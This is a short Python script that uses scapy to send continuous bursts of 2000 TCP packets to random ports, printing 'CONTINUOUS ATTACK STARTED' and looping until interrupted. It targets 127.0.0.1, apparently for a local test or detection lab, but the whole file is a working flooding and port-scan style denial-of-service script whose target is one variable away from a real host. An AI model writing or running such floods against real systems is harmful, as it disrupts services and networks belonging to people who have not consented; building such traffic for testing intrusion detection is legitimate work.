from scapy.all import IP, TCP, send
import random
import time

target_ip = "127.0.0.1"

print("🔥 CONTINUOUS ATTACK STARTED (CTRL+C to stop)")

try:
    while True:
        packets = []

        for i in range(2000):
            pkt = IP(dst=target_ip)/TCP(dport=random.randint(1, 65535))
            packets.append(pkt)

        send(packets, verbose=False)

        print("💥 Burst sent")

        time.sleep(0.5)  # 🔥 keeps attack continuous

except KeyboardInterrupt:
    print("\n🛑 Attack stopped")